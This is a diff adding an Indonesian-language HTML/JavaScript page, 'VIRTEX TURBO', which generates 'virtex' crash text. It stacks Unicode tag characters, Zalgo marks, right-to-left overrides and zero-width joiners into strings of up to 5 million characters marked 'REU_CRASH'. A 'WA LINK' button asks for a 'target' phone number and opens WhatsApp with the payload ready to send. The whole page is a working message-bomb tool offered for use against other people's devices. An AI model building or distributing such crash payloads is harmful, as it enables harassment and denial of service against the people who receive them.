@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>REU | VIRTEX EXPRESS - 999.999 MAX</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            background: radial-gradient(circle at 20% 30%, #03071e, #000);
+            font-family:'Share Tech Mono',monospace;
+            padding:20px;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
+        .terminal{
+            background:#0a0e1ccc;
+            backdrop-filter:blur(10px);
+            border:2px solid #0cf;
+            border-radius:28px;
+            box-shadow:0 0 30px #0cf;
+            max-width:950px;
+            width:100%;
+            padding:1.8rem;
+        }
+        h1{
+            background:linear-gradient(135deg,#0cf,#0044ff);
+            -webkit-background-clip:text;
+            background-clip:text;
+            color:transparent;
+            font-size:1.8rem;
+        }
+        .badge{
+            border:1px solid #0cf;
+            color:#0cf;
+            padding:2px 12px;
+            border-radius:30px;
+            font-size:0.7rem;
+        }
+        .control{
+            background:#03060faa;
+            border-radius:24px;
+            padding:1rem;
+            margin:1rem 0;
+        }
+        .slider-group label{
+            color:#8ecaff;
+            display:flex;
+            justify-content:space-between;
+        }
+        input[type="range"]{
+            width:100%;
+            height:5px;
+            background:#1f2a4e;
+            border-radius:10px;
+            -webkit-appearance:none;
+        }
+        input[type="range"]::-webkit-slider-thumb{
+            -webkit-appearance:none;
+            width:18px;
+            height:18px;
+            background:#0cf;
+            border-radius:50%;
+            cursor:pointer;
+            box-shadow:0 0 8px cyan;
+        }
+        .num-input{
+            background:#010314;
+            border:1px solid #0cf;
+            color:#0cf;
+            padding:8px;
+            border-radius:20px;
+            width:100%;
+            text-align:center;
+            font-family:monospace;
+            font-size:1.2rem;
+            margin-top:10px;
+        }
+        .btn-group{
+            display:flex;
+            flex-wrap:wrap;
+            gap:10px;
+            margin:15px 0;
+        }
+        .cyber-btn{
+            background:#0b142e;
+            border:1px solid #0cf;
+            color:#0cf;
+            padding:10px 16px;
+            border-radius:40px;
+            cursor:pointer;
+            flex:1;
+            text-align:center;
+            transition:0.2s;
+        }
+        .cyber-btn.primary{
+            background:#0cf;
+            color:#000;
+            box-shadow:0 0 10px #0cf;
+        }
+        .cyber-btn:hover{
+            transform:translateY(-2px);
+            background:#0cf33;
+        }
+        textarea{
+            width:100%;
+            background:#01020ae6;
+            border:1px solid #0cf;
+            border-radius:20px;
+            padding:1rem;
+            color:#bbf0ff;
+            font-family:monospace;
+            font-size:0.8rem;
+            resize:vertical;
+            margin:10px 0;
+        }
+        .progress-bar{
+            width:100%;
+            height:12px;
+            background:#1a1f2e;
+            border-radius:20px;
+            margin:10px 0;
+            overflow:hidden;
+        }
+        .progress-fill{
+            width:0%;
+            height:100%;
+            background:#0cf;
+            transition:width 0.1s;
+        }
+        .info{
+            background:#00000066;
+            border-left:4px solid #0cf;
+            padding:0.7rem;
+            font-size:0.7rem;
+            color:#99ccff;
+        }
+        .glitch-notif{
+            position:fixed;
+            top:35%;
+            left:50%;
+            transform:translate(-50%,-50%);
+            background:#000;
+            border:3px solid red;
+            color:red;
+            padding:15px 30px;
+            font-size:2.5rem;
+            font-weight:bold;
+            font-family:monospace;
+            text-shadow:2px 2px 0 #ff00aa;
+            z-index:9999;
+            animation:glitch 0.2s infinite;
+            white-space:nowrap;
+        }
+        @keyframes glitch{
+            0%{transform:translate(-50%,-50%) skew(0deg);}
+            20%{transform:translate(-52%,-48%) skew(2deg);}
+            40%{transform:translate(-48%,-52%) skew(-2deg);}
+            100%{transform:translate(-50%,-50%) skew(0deg);}
+        }
+        footer{text-align:center;margin-top:1rem;font-size:0.65rem;color:#0cf77;}
+    </style>
+</head>
+<body>
+<div class="terminal">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+        <h1>⚡ VIRTEX TURBO ⚡</h1>
+        <span class="badge">MAX 999.999 | FAST GEN</span>
+    </div>
+    <div class="control">
+        <div class="slider-group">
+            <label>💀 INTENSITAS (1 - 999.999) <span id="intVal">5000</span></label>
+            <input type="range" id="slider" min="1" max="999999" value="5000" step="500">
+            <input type="number" id="numInput" class="num-input" value="5000" min="1" max="999999">
+            <div style="font-size:0.7rem; color:#ff8888; margin-top:5px;">⚠️ Intensitas > 50.000 tetap cepat karena output maksimal 5MB</div>
+        </div>
+    </div>
+    <div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div>
+    <div class="btn-group">
+        <button id="genBtn" class="cyber-btn primary">🚀 GENERATE (CEPAT)</button>
+        <button id="copyBtn" class="cyber-btn">📋 COPY</button>
+        <button id="clearBtn" class="cyber-btn">🗑 RESET</button>
+        <button id="waBtn" class="cyber-btn">📲 WA LINK</button>
+    </div>
+    <textarea id="virtexBox" rows="5" readonly placeholder="Hasil virtex akan muncul di sini..."></textarea>
+    <div class="info">
+        🔥 MODE LOCKED | GENERATE SUPER CEPAT | MAKS OUTPUT 5MB<br>
+        • Kombinasi Tag Character U+E0000 + Zalgo + RTL + ZWJ.<br>
+        • Kalau input > 999.999 → notif <span style="color:#f00;">"KELEBIHAN WOI"</span> glitch.<br>
+        • Gak lemot lagi, Bos!
+    </div>
+    <footer>REU TERMINAL — gigscvai — /LOCKED</footer>
+</div>
+<script>
+    (function(){
+        const slider = document.getElementById('slider');
+        const numInput = document.getElementById('numInput');
+        const intSpan = document.getElementById('intVal');
+        const genBtn = document.getElementById('genBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const waBtn = document.getElementById('waBtn');
+        const textarea = document.getElementById('virtexBox');
+        const progressFill = document.getElementById('progressFill');
+
+        function syncFromSlider(){
+            let v = parseInt(slider.value,10);
+            if(isNaN(v)) v=1;
+            if(v>999999) v=999999;
+            numInput.value = v;
+            intSpan.innerText = v.toLocaleString();
+        }
+        function syncFromNum(){
+            let v = parseInt(numInput.value,10);
+            if(isNaN(v)) v=1;
+            if(v > 999999){
+                showGlitch("KELEBIHAN WOI");
+                v = 999999;
+                numInput.value = 999999;
+            }
+            if(v<1) v=1;
+            slider.value = v;
+            intSpan.innerText = v.toLocaleString();
+        }
+        slider.addEventListener('input', syncFromSlider);
+        numInput.addEventListener('input', syncFromNum);
+        syncFromSlider();
+
+        function showGlitch(msg){
+            const d = document.createElement('div');
+            d.className = 'glitch-notif';
+            d.innerText = msg;
+            document.body.appendChild(d);
+            setTimeout(()=>d.remove(),1300);
+        }
+
+        // Generator super cepat dengan batas output 5MB (~5.000.000 karakter)
+        function generateFastVirtex(intensity){
+            return new Promise((resolve) => {
+                let limit = Math.min(parseInt(intensity), 999999);
+                if(isNaN(limit)) limit = 1000;
+                // Tentukan kepadatan: makin tinggi intensitas, makin padat karakter berbahaya per iterasi
+                // Tapi total output tetap kita batasi 5MB
+                const MAX_OUTPUT_LEN = 5_000_000; // 5 juta karakter
+                let density = Math.min(500, Math.floor(limit / 200) + 20);
+                if(density < 20) density = 20;
+                if(density > 800) density = 800;
+                
+                // Precompute karakter berbahaya
+                let tagChars = "";
+                for(let i=0xE0000; i<=0xE007F; i++) tagChars += String.fromCodePoint(i);
+                let zalgo = "̴̵̶̷̸̡̢̧̨̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼͇͈͉͍͎̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛ͣͤͥͦͧͨͩͪͫͬͭͮͯ͘͜͟͢͝͞͠͡";
+                let rtl = "\u202E";
+                let lro = "\u202D";
+                let zwj = "‍";
+                
+                // Gunakan array chunk biar cepat
+                let chunks = [];
+                let totalLen = 0;
+                let iterations = 0;
+                // Kita loop sampai mencapai max output atau cukup padat
+                while(totalLen < MAX_OUTPUT_LEN && iterations < 3000) { // maks 3000 iterasi biar cepet
+                    let block = "";
+                    // layer tag character
+                    block += tagChars.repeat(density % 30);
+                    // zalgo random
+                    for(let z=0; z< (density % 40); z++) block += zalgo[Math.floor(Math.random()*zalgo.length)];
+                    block += rtl + "REU_CRASH" + lro;
+                    block += zwj.repeat(density % 50);
+                    block += "﷽".repeat(Math.min(20, density/10));
+                    block += "\u200B\u200C".repeat(10);
+                    chunks.push(block);
+                    totalLen += block.length;
+                    iterations++;
+                    // Update progress bar setiap 100 iterasi
+                    if(iterations % 100 === 0){
+                        let percent = Math.min(100, (totalLen/MAX_OUTPUT_LEN)*100);
+                        progressFill.style.width = percent + "%";
+                    }
+                }
+                let finalStr = chunks.join('');
+                if(finalStr.length > MAX_OUTPUT_LEN) finalStr = finalStr.slice(0, MAX_OUTPUT_LEN);
+                progressFill.style.width = "100%";
+                setTimeout(()=>{
+                    progressFill.style.width = "0%";
+                    resolve(finalStr);
+                }, 200);
+            });
+        }
+
+        genBtn.onclick = async () => {
+            let val = parseInt(numInput.value,10);
+            if(isNaN(val)) val = 5000;
+            if(val > 999999){
+                showGlitch("KELEBIHAN WOI");
+                return;
+            }
+            textarea.value = "⏳ Generating... (proses cepat, tunggu sebentar)";
+            let result = await generateFastVirtex(val);
+            textarea.value = result;
+            if(result.length < 100) showGlitch("VIRTEX TERGENERASI!");
+        };
+        copyBtn.onclick = async () => {
+            if(!textarea.value || textarea.value.includes("Generating")){
+                showGlitch("VIRTEX KOSONG!");
+                return;
+            }
+            await navigator.clipboard.writeText(textarea.value);
+            showGlitch("✓ VIRTEX COPIED!");
+        };
+        clearBtn.onclick = () => { textarea.value = ""; };
+        waBtn.onclick = () => {
+            let nomor = prompt("Nomor target (62xxx):", "6281234567890");
+            if(!nomor) return;
+            let teks = textarea.value;
+            if(!teks || teks.includes("Generating")){
+                showGlitch("GENERATE DULU!");
+                return;
+            }
+            let short = teks.slice(0,1800);
+            window.open(`https://wa.me/${nomor}?text=${encodeURIComponent(short)}`,'_blank');
+            showGlitch("BUKA WA, PASTE MANUAL FULL VIRTEX");
+        };
+        // default generate sedikit
+        generateFastVirtex(5000).then(res => textarea.value = res);
+    })();
+</script>
+</body>
+</html>
